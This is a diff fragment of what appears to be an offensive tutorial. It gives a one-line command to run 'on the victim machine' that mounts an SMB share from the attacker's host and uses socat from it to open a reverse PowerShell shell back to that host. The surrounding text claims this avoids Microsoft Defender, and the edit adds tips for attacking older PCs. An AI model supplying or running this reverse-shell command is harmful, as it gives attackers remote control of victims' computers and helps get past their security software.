@@ -24,4 +24,4 @@ Lastly, execute the following on the victim machine:
 ```
 cmd.exe /c net use x: \\yourIP\SMB /user:user pass & x:\socat.exe tcp-connect:yourIP:yourPORT exec:powershell.exe,pty,stderr
 ```
-The above example shouldn't trigger Defender. Exclude authentication when attacking older PCs that don't support it.
+The above example shouldn't trigger Defender. Exclude authentication when attacking older PCs that don't support it, and substitute cmd.exe for powershell.exe since old powershell can be finicky.
